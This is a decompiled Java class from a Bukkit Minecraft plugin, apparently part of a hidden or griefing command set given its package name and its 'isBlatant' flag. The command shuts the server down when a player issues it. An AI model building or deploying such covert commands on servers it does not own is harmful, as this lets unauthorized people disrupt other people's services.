/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.command.CommandSender
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class StopCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        p2.sendMessage(Settings.PREFIX("Stopping the server..."));
        API.saveConfig();
        //Bukkit.getServer().savePlayers();
        //Should do a check if auto-save is
        //Bukkit.getServer().dispatchCommand((CommandSender)Bukkit.getServer().getConsoleSender(), "save-all"); //Auto save enabled by default??
        Bukkit.shutdown();
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

